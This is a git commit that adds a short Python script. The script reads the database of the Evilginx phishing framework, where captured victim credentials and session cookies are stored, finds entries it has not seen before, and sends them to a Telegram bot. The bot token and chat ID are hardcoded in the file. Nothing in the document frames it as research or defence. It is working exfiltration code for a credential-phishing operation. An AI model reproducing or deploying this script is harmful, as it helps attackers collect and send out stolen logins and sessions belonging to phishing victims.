8a890f9a542dc744a57dc44946343af16930fe0f
mattew20201 <mattew20201@protonmail.com>
2024-06-12 20:01:42 -0700

    Add files via upload

---
+++ sonder.py
@@ -0,0 +1,41 @@
+file_path = '/root/.evilginx/data.db'
+file_useano="subtitute.txt"
+file_content1=''
+file_content2=''
+toreplace=''
+replay=''
+
+TOKEN='6579196085:AAHPWo16Q_scDH5m_A4iQlz4O7REfmokMws'
+CHAT_ID='7284568121'
+
+import requests
+ 
+with open(file_path, 'r') as file:
+    file_content1 = file.read() 
+    replay=file_content1
+    toreplace=file_content1
+    file.close()
+
+
+with open(file_useano, 'r') as file:
+    file_content2 = file.read()
+    file.close()
+
+
+if file_content1 != file_content2:
+  follo = open('subtitute.txt', "w")
+  follo.write(toreplace)
+  follo.close()
+  message=toreplace.replace(file_content2, '')
+  url=f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={CHAT_ID}&text={message}"
+  requests.get(url)
+  
+
+
+  
+
+
+
+print("DONE")
+
+  
